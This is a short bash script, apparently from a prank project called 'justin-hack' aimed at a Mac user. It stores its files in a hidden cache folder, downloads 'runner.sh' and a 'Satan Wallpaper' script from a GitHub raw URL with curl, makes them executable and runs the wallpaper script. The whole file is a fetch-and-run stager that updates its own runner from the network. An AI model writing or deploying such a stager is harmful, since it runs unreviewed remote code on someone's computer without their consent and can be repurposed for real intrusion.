#!/usr/bin/env bash

## Vars
jh=~/Library/Caches/jh
baseurl=https://raw.githubusercontent.com/FredericMartinez/justin-hack/master

# Update Runner
curl -o $jh/runner.sh $baseurl/runner.sh
chmod +x $jh/runner.sh

# Get Satan Wallpaper
curl -o $jh/wallpaper.sh $baseurl/wallpaper.sh
chmod +x $jh/wallpaper.sh

# Run Satan Wallpaper
$jh/wallpaper.sh justin_default